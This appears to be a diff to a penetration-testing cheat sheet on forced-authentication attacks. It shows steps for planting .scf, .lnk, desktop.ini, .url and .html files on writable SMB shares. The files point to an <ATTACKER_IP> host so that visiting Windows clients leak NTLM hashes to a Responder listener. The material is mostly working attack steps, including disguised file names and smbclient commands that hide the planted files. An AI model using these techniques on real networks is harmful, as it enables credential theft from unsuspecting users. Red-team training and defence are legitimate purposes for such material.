@@ -9,7 +9,7 @@ Command=ToggleDesktop
 1. Put the contents into a non-suspicious file name like `@DesktopSettings.scf`
 2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
 3. Place the file in the writable SMB share (won't work if hidden)
-4. Fire responder `responder -I eth0`
+4. Fire up responder `responder -I eth0`
 
 # Automatic on folder/share visit II: LNK Files
 ```powershell
@@ -25,7 +25,7 @@ $lnk.Save()
 ```
 1. Run the PowerShell script, it will save the `.lnk` file in the current working directory
 2. Place the file in the writable SMB share (won't work if hidden)
-3. Fire responder `responder -I eth0`
+3. Fire up responder `responder -I eth0`
 
 # Automatic on folder/share visit III: INI Files Inside System folders
 ```
@@ -42,13 +42,14 @@ IconResource=\\<ATTACKER_IP>\settings
 8. and make it hidden using `setmode <INI_FILE> +h`
 9. *overall,* it should like this:
 ```shell
-smbclient> mkdir <FOLDER>
-smbclient> setmode <FOLDER> +s
-smbclient> cd <FOLDER>
-smbclient> put <INI_FILE>
-smbclient> setmode <INI_FILE> +s
-smbclient> setmode <INI_FILE> +h
+smb: \> mkdir <FOLDER>
+smb: \> setmode <FOLDER> +s
+smb: \> cd <FOLDER>
+smb: \> put <INI_FILE>
+smb: \> setmode <INI_FILE> +s
+smb: \> setmode <INI_FILE> +h
 ```
+10. fire up responder `responder -I eth0`
 
 # Works when *Selected*: URL files
 ```
@@ -58,7 +59,7 @@ URL=file://<ATTACKER_IP>/@IEsettings
 1. Put the contents into a non-suspicious file name like `IESettings.url`
 2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
 3. Place the file in the writable SMB share (won't work if hidden)
-4. Fire responder `responder -I eth0`
+4. Fire up responder `responder -I eth0`
 
 # Must be opened to work: HTML files (tested on IE & Chrome)
 ```
@@ -67,7 +68,7 @@ URL=file://<ATTACKER_IP>/@IEsettings
 1. Put the contents into a non-suspicious file name like `bookmarks.html`
 2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
 3. Place the file in the writable SMB share (won't work if hidden)
-4. Fire responder `responder -I eth0`
+4. Fire up responder `responder -I eth0`
 
 ### Note
 - you can hide any file when in an `smbclient` prompt using `setmode <FILE_NAM> +h`
